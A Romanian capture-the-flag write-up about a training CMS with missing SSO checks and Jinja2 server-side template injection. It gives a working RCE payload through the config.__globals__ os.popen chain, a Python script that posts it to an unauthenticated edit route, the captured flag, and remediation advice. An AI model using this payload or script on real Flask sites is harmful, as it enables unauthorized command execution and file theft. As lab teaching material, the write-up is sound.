# Write-Up: Redacția CMS (Broken Access Control & Jinja2 SSTI to RCE)

**Platforma:** InvataCyber.ro  
**Categorie:** Web Security / Server-Side Exploitation  
**Vulnerabilitate:** Broken Access Control + Server-Side Template Injection (SSTI)  
**Impact:** Execuție de Comenzi la Nivel de Sistem (RCE) și Citire Fișiere Confidențiale (`/flag.txt`)  
**Format Flag:** `InvataCyber{...}`  

---

## 1. Descrierea Provocării

> Aceeași redacție, altă problemă.  
> După migrarea de pe vechiul CMS, SSO-ul nu a mai fost configurat pe instanța asta, așa că panoul de editor este accesibil direct, fără cont. Poți scrie și publica articole ca și cum ai face parte din echipă.  
> Configurarea greșită este doar începutul. Conținutul articolelor nu este doar afișat la vizualizare, ci procesat de server înainte să ajungă în pagină.  
> Locație flag: `/flag.txt`  
> Format flag: `InvataCyber{...}`

---

## 2. Analiză Inițială și Vectorul de Atac

Aplicația prezintă două deficiențe critice de securitate înlănțuite:

1. **Broken Access Control (Lipsă Autentificare SSO):**  
   În urma procesului de migrare de infrastructură, middleware-ul responsabil de validarea sesiunii Single Sign-On (SSO) nu a fost atașat pe rutele de gestiune a articolelor (`/edit/<id>`, `/new-post`). Oricine poate trimite cereri HTTP POST pentru a suprascrie sau publica articole pe blog fără niciun fel de credențiale.

2. **Server-Side Template Injection (SSTI):**  
   Enunțul precizează că: *„Conținutul articolelor nu este doar afișat la vizualizare, ci procesat de server înainte să ajungă în pagină.”*  
   Aceasta indică utilizarea nesigură a unei funcții de randare dinamică a șabloanelor în backend (de exemplu `render_template_string()` în Python Flask/Jinja2), în care conținutul furnizat de utilizator devine parte din codul șablonului compilat, în loc să fie tratat drept simplă variabilă de date.

---

## 3. Identificarea Motorului de Șabloane (SSTI Fingerprinting)

Am editat un articol de test (de exemplu articolul ID 5 pe ruta `/edit/5`), introducând expresii matematice specifice motoarelor de template:

* **Test inițial:** `{{ 7 * 7 }}`  
  La accesarea rutei de vizualizare `GET /post/5`, conținutul afișat în pagină a fost:
  ```html
  <div class="post-content">49</div>
  ```
* **Test specific Jinja2 / Python:** `{{ 'a' * 3 }}`  
  Rezultat: `aaa`.

Rezultatele au confirmat prezența motorului **Jinja2** rulat peste un mediu **Python (Flask)**.

---

## 4. Evadarea din Sandbox și Execuția Arbitrară de Cod (RCE)

În Jinja2, variabilele expuse implicit în contextul de randare (cum ar fi `config`, `self`, `g` sau `lipsum`) oferă referințe către obiecte Python din runtime. Prin mecanismul de introspecție `__class__.__init__.__globals__`, putem naviga către spațiul global de nume (namespace) al modulului și accesa direct biblioteca standard de sistem `os`.

### Structura Lanțului de Introspecție:
1. `config` $\rightarrow$ instanța curentă `flask.config.Config`
2. `config.__class__` $\rightarrow$ clasa `Config`
3. `config.__class__.__init__` $\rightarrow$ metoda de inițializare a clasei
4. `config.__class__.__init__.__globals__` $\rightarrow$ dicționarul variabilelor și modulelor globale
5. `config.__class__.__init__.__globals__['os']` $\rightarrow$ modulul `os` din Python
6. `os.popen('cat /flag.txt').read()` $\rightarrow$ execuția comenzii de sistem și capturarea ieșirii standard (stdout)

### Payload-ul Final SSTI:
```jinja2
{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

---

## 5. Scriptul de Exploatare Automatizată (`blog_flag.py`)

Am automatizat ciclul complet (editare articol $\rightarrow$ publicare payload $\rightarrow$ vizualizare și extragere flag) prin scriptul [`blog_flag.py`](blog_flag.py):

```python
import urllib.request
import urllib.parse

edit_url = "http://target.invatacyber.ro/edit/5"
view_url = "http://target.invatacyber.ro/post/5"
payload = "{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

data = urllib.parse.urlencode({
    "title": "Audit Post",
    "content": payload
}).encode("utf-8")

# 1. Trimitere cerere POST de actualizare a articolului (Broken Access Control)
req = urllib.request.Request(edit_url, data=data, method="POST")
req.add_header("Content-Type", "application/x-www-form-urlencoded")

with urllib.request.urlopen(req) as resp:
    resp.read()

# 2. Accesare articol pentru declanșarea evaluării SSTI în backend
view_req = urllib.request.Request(view_url)
with urllib.request.urlopen(view_req) as resp:
    html_output = resp.read().decode("utf-8")
    print(html_output)
```

---

## 6. Rezultat și Obținerea Flag-ului

La execuția scriptului:
1. Articolul cu ID 5 a fost salvat în baza de date cu conținutul malițios Jinja2.
2. La vizualizarea `/post/5`, serverul Flask a apelat `render_template_string()`, evaluând instrucțiunea Python `os.popen('cat /flag.txt').read()`.
3. Comanda a citit fișierul `/flag.txt` din sistemul de fișiere al containerului gazdă.

Ieșirea generată în pagina HTML:
```html
<article class="post">
  <h2>Audit Post</h2>
  <div class="content">
    InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}
  </div>
</article>
```

**Flag obținut:** `InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}`

---

## 7. Măsuri de Remediere (Mitigare)

1. **Restaurarea și Forțarea Autentificării SSO:**
   Toate rutele de creare și editare trebuie protejate prin decoratori de autorizare (e.g. `@login_required` sau verificarea token-ului de sesiune SSO):
   ```python
   @app.route('/edit/<int:post_id>', methods=['GET', 'POST'])
   @require_sso_role('editor')
   def edit_post(post_id):
       ...
   ```
2. **Separarea Datelor de Șabloane (Evitarea `render_template_string`):**
   Conținutul introdus de utilizatori nu trebuie compilat niciodată ca șablon Jinja2. Trebuie utilizat un șablon static pre-compilat, iar textul articolului trebuie pasat drept parametru de context:
   ```python
   # INCORECT (Vulnerabil SSTI):
   return render_template_string(post.content)

   # CORECT (Securizat):
   return render_template('post_view.html', content=post.content)
   ```
3. **Sandbox Jinja2 / SandboxedEnvironment:**
   Dacă este absolut necesară randarea de șabloane definite de utilizator, trebuie utilizat `jinja2.sandbox.SandboxedEnvironment` cu interzicerea accesului la atribute private (`__class__`, `__globals__`).
4. **Principiul Privilegiului Minim (PoLP) în Sistemul de Operare:**
   Procesul web server nu trebuie să ruleze ca `root`, iar fișierele critice de sistem trebuie să aibă permisiuni restrictive (`chmod 400`).
